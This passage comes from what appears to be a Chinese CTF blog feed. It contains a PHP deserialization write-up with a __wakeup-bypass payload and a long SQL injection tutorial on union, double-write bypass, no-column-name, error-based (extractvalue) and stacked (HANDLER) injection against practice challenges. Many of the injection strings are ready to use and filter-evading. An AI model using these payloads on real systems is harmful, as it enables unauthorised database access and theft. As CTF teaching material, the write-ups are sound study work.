class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  ......</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    ......</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;three.js&#x2F;r70&#x2F;three.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;gsap&#x2F;1.16.1&#x2F;TweenMax.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;OrbitControls.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;Cat.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script  src&#x3D;&quot;index.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到index.php中有对get的select参数进行反序列化操作，并且题目给了一个class.php中的Name类，于是构造反序列化条件：</p><p>观察chass.php代码发现只要令password=100，username=admin，且绕过__wakeup函数即可，于是得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">"%00Name%00username"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"%00Name%00password"</span>;s:<span class="number">3</span>:<span class="string">"100"</span>;&#125;</span><br></pre></td></tr></table></figure><p>传入即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/03/22/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/22/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="极客大挑战—LoveSQL"><a href="#极客大挑战—LoveSQL" class="headerlink" title="极客大挑战—LoveSQL"></a>极客大挑战—LoveSQL</h3><p><strong>解题核心</strong> ———————- <a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc" target="_blank" rel="noopener"><strong>group_concat</strong>()</a></p><p>界面：</p><img src="https://i.loli.net/2020/03/27/Axos1ZnBL2yN5YD.png" style="zoom: 33%;" /><p>随后开始注入查询：</p><p>经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段</p><p>查数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata ;<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/EZcliF9LePvxQMp.png" style="zoom:33%;" /><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/ik9CEy52cfo7nGQ.png" style="zoom:33%;" /><p>查列：</p><img src="https://i.loli.net/2020/03/27/XS8QfoNGqtMcdL5.png" style="zoom:33%;" /><p>最后password对应的表名应该是前面查询表名最后一个</p><p>查l0ve1ysq1表最后一列的字段内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>最终得到flag</p><h3 id="极客大挑战—BabySQL"><a href="#极客大挑战—BabySQL" class="headerlink" title="极客大挑战—BabySQL"></a>极客大挑战—BabySQL</h3><p><strong>解题核心</strong>—————–双写绕过</p><p>详细见CSDN上大佬的<a href="https://blog.csdn.net/whoim_i/article/details/102869687" target="_blank" rel="noopener">文章</a>，另外附上文章的HTML文档</p><p>解题方法和上一个题目的差不多，只是这次多了个双写绕过</p><p>查库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' uniunionon seselectlect null,null,group_concat(schema_name) frfromom infoorrmation_schema.schemata ;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect null,null,group_concat(table_name) frfromom infoorrmation_schema.tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect null,null,group_concat(column_name) frfromom infoorrmation_schema.columns;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查字段，反复尝试后发现flag在表b4bsql中的password列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect null,null,group_concat(passwoorrd) frfromom b4bsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p><p>界面：</p><img src="https://i.loli.net/2020/03/27/fC6dephA2EGPTkt.png" alt="SWPU2019-Web1" style="zoom: 67%;" /><p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p><p>登录后界面：</p><p><img src="https://i.loli.net/2020/03/27/y3YFO5dUm164Vbf.png" alt="image-20200203114732943"></p><p>广告申请界面：</p><img src="https://i.loli.net/2020/03/27/CYufWMHk5dvQZXp.png" alt="image-20200203114757380" style="zoom:67%;" /><p>随便申请一个：</p><p><img src="https://i.loli.net/2020/03/27/JdWt2SMC1DfKNvj.png" alt="image-20200203114826534"></p><p>首页显示：</p><img src="D:\Blog\source\_posts\SQL注入.assets\image-20200203114846869.png" alt="image-20200203114846869" style="zoom:67%;" /><p>广告详情：</p><p><img src="https://i.loli.net/2020/03/27/MrPNK86afEWqQLj.png" alt="image-20200203114909970"></p><p>在广告申请界面测试后发现存在SQL注入</p><p><img src="https://i.loli.net/2020/03/27/RlfK1yp3mQCiV74.png" alt="image-20200203115205872"></p><p>配合union查询查列数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>&amp;&amp;<span class="comment">/**/</span><span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><ul><li>过滤了–+和#，故闭合最后的单引号</li><li>过滤了空格用/**/分离参数</li></ul></blockquote><p>有22列，由广告详情界面显示可知，第2,3列可注入</p><p><img src="https://i.loli.net/2020/03/27/E3zDiPNc7unoKsZ.png" alt="image-20200203115417817"></p><p>查数据库库，数据库版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">version</span>(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/M4rw6VvsudEANGF.png" alt="image-20200203120627065"></p><p><img src="https://i.loli.net/2020/03/27/bx5NetmhDY3zUsw.png" alt="image-20200203115555268"></p><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><ul><li>此处利用无列名注入</li><li>过滤了information_scheam库的查询，故使用其它库进行查询，此题场景为buuctf上的复现题目，用到mysql库中的mysql.innodb_table_stats表（mysql在5.5.x版本后，默认使用innodb作为存储引擎），比赛时原题可用sys库中的sys.schema_auto_increment_columns表进行查询(mysql版本&gt;5.7时，新增了sys数据库，基础数据来自于performance_chema和information_schema两个库，但是本身数据库不存储数据)，查询语句和上面的一样</li><li>参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">官方文档</a></li><li>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li><li>参考：<a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">概述MySQL统计信息</a></li></ul></blockquote><p><img src="https://i.loli.net/2020/03/27/LA2Tq1n3WSZd64r.png" alt="image-20200203121328487"></p><p>查列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><blockquote><p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p></blockquote><p>列数错误时：</p><p><img src="https://i.loli.net/2020/03/27/LH4Zv1tMgyw9nFB.png" alt="image-20200203122125088"></p><p><img src="https://i.loli.net/2020/03/27/WA96BqpKjUxmkET.png" alt="image-20200203122147423"></p><p>然后再配合无列名注入注出user表中的flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/OVRLtoYlm12nI4i.png" alt="image-20200203122342091"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p><p>界面：</p><p><img src="https://i.loli.net/2020/03/27/Ep7suTQAcjo26PJ.png" style="zoom: 33%;" /><img src="D:%5CBlog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5.assets%5Cimage-146.png" alt=""></p><p>经过测试发现过滤了：空格，=，order by，union，and</p><p>用^异或操作代替union，用updatexml()或extractvalue()报错注入，以下均使用extractvalue()函数</p><p>查库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">database</span>())))));<span class="comment">#查当前数据库</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/OzubA1Q8D3BpWm2.png" style="zoom:33%;" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(schema_name))<span class="keyword">from</span>(information_schema.schemata))));<span class="comment">#查所有数据库</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/WACchVaOkzrFv2t.png" style="zoom:33%;" /><p>这里为什么没有显示当前geek数据库有点纳闷，可能是这个查询屏蔽了geek数据库</p><p>查表（like代替=进行查询）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>((table_schema)<span class="keyword">like</span><span class="string">'geek'</span>))));<span class="comment">#查geek数据库下的表</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/xvZuzYk1MRhrS6c.png" style="zoom:33%;" /><p>查列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>((table_name)<span class="keyword">like</span><span class="string">'H4rDsq1'</span>))));<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/19BJY2FKntgWl4L.png" style="zoom:33%;" /><p>查字段（限制了显示的字符串数，利用left()，right()查询）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1))));<span class="comment">#查左边</span></span><br><span class="line"></span><br><span class="line">1'^extractvalue(1,concat(1,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1))));<span class="comment">#查右边</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/fqWEiZyx9AKuRDp.png" style="zoom:33%;" /><img src="https://i.loli.net/2020/03/27/n5AMzKb8ZglahmE.png" style="zoom:33%;" /><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="2020ichunqiu新春公益赛—blacklist"><a href="#2020ichunqiu新春公益赛—blacklist" class="headerlink" title="2020ichunqiu新春公益赛—blacklist"></a>2020ichunqiu新春公益赛—blacklist</h3><p>这个题目可参考  [强网杯 2019]supersql</p><p>不过这题过滤的东西要多一些，常用的两种方法：</p><blockquote><p>预编译注入绕过关键词：set、prepare</p><p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p></blockquote><p>都被过滤用不了了</p><p><img src="https://i.loli.net/2020/03/27/Juin3SGqkeVxfpX.png" alt="image-20200225122608274"></p><p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">详</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> cool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">next</span>;</span><br></pre></td></tr></table></figure><p>通过以上三条语句应该就能得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p><p><img src="https://i.loli.net/2020/03/27/7bxJWosa2PNCnRg.png" alt="image-20200225123532230"></p><h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p><ul><li>堆叠注入</li><li>*的使用</li><li>sql_mode 的应用</li></ul><p><img src="https://i.loli.net/2020/03/27/UyvVse24JRKQZFY.png" alt=""></p><p>听说比赛的时候泄露了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 